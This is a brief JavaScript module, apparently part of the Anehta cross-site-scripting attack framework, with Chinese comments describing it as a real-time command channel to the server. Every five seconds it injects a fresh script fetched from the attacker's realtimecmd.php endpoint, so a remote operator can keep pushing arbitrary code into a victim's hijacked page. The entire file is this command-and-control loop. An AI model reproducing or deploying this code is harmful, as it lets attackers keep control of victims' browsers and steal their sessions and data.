alert("realtimecmd.js");
///////////////////////////////////////////
//// 实时命令模块,与服务端进行通行
///////////////////////////////////////////
var timeInterval = 5000;  // 时间间隔
var realtimeCmdMaster = anehtaurl + "/realtimecmd.php?";

setInterval(function(){
  var timesig = new Date();
	anehta.inject.injectScript(realtimeCmdMaster+timesig);
  },
timeInterval);


